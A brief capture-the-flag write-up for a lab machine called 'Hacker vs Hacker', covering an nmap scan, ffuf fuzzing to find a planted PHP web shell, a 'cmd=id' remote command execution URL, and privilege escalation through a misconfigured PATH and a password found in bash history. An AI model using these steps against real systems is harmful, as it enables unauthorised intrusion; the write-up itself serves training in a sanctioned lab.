
# Hacker vs Hacker

## *What is the user.txt flag?*

We'll start with nmap scan:

```bash
$ sudo nmap 10.10.207.8 -Pn -p- -vv -T4 -A --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

Select running services:

```bash
$ cat nmap-scan | grep -o -e '[0-9]\+/tcp .*'
```

- [ ] 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
- [ ] 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))

By looking at comments we discover there's a ***/cvs*** directory, where the cvs are
uploaded. Visit it and read the hacker's taunt: it becomes apparent that the reverse
shell's name is like REVERSE-SHELL.pdf.php

Launch ffuf to find out the name:

```bash
$ ./ffuf -u http://10.10.207.8/cvs/FUZZ.pdf.php -ic -t 55 -o ~/CTF/HackerVsHacker/ffuf-csv-report.html -w ~/CyberSecurity/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

Visit http://10.10.207.8/cvs/shell.pdf.php

Try bruteforcing url parameters to gain RCE. The most common one is "cmd": and we're
lucky, the hacker used it!

PoC: http://10.10.207.8/cvs/shell.pdf.php?cmd=id

---

## *What is the proof.txt flag?*

Read the .bash_history file of lachlan. There's a name of backdoor that can be used for
LPE. Abuse the misconfigured PATH variable. There's also a password: thisistheway123

